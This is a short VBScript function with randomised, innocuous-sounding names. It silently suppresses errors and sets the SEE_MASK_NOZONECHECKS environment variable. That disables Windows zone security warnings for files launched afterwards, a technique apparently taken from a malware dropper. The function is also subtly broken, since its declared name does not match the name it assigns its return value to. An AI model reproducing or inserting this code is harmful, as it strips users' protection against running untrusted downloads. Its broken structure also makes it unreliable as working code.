Function FetchPolicyBlock36()
On Error Resume Next
  Dim strSync20,strProfile47,strPolicyBlock80
  Set strSync20=CreateObject("WScript.Shell")
  strProfile47=strSync20.ExpandEnvironmentStrings("%TEMP%")
  strPolicyBlock80=strSync20.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strProfile47)>0 And Len(strPolicyBlock80)>0 Then
    strSync20.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    FetchPolicyBlock6=1
    Exit Function
  End If
  FetchPolicyBlock6=0
End Function

